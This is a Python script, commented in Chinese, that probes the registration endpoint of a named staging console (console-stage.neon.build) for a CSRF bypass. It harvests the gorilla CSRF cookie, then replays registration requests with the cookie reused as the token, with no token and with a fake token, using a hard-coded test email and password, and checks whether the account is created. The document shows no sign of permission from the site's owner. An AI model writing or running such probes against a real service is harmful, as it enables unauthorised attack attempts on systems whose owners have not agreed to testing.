# -*- coding: utf-8 -*-
"""/api/register CSRF 绕过尝试:
1. GET / 拿 _gorilla_csrf cookie
2. POST /api/register 带 X-CSRF-Token=各种形态 -> 观察错误(字段要求/可用性)
"""
import http.client, ssl, json, re

ctx = ssl.create_default_context()
HOST = 'console-stage.neon.build'

def raw_req(method, path, headers=None, body=None):
    conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    if headers:
        h.update(headers)
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    st = r.status
    conn.close()
    return st, hdrs, raw.decode('utf-8', 'replace')

# 1. 拿 cookie(未登录根路径)
st, hdrs, body = raw_req('GET', '/')
print('[GET /] %d' % st, flush=True)
cookies = hdrs.get('set-cookie', '')
for part in cookies.split(','):
    kv = part.strip().split(';')[0]
    if '=' in kv:
        print('  set-cookie:', kv, flush=True)
csrf = ''
for part in cookies.split(','):
    kv = part.strip().split(';')[0]
    if kv.startswith('_gorilla_csrf='):
        csrf = kv.split('=', 1)[1]
print('  csrf cookie = %s' % csrf[:40], flush=True)

# 2. POST /api/register 变体
base_hdrs = {'Content-Type': 'application/json',
             'Origin': 'https://console-stage.neon.build',
             'Referer': 'https://console-stage.neon.build/',
             'Cookie': '_gorilla_csrf=%s' % csrf}
tests = [
    ('cookie-as-token', {'X-CSRF-Token': csrf}),
    ('no-token', {}),
    ('fake-token', {'X-CSRF-Token': 'deadbeef' * 8}),
]
for label, extra in tests:
    hd = dict(base_hdrs)
    hd.update(extra)
    st, hdrs2, body2 = raw_req('POST', '/api/register', hd,
                               json.dumps({'email': 'libobo1229+secctl@gmail.com',
                                           'password': 'SecTest!2026pass2'}).encode())
    print('\n[%s] -> %d %s' % (label, st, body2[:400].replace('\n', ' ')), flush=True)
    # 若 302 = 注册成功?
    if hdrs2.get('location'):
        print('  LOCATION: %s' % hdrs2['location'], flush=True)
